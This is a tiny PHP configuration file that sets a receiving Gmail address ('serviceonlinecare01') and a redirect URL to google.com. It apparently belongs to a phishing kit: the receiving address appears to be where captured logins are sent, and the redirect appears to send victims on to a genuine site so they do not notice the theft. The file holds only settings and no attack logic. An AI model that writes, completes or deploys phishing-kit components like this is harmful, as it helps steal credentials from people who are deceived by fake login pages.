<?php 
$Receive_email="serviceonlinecare01@gmail.com";
$redirect="https://www.google.com/";
?>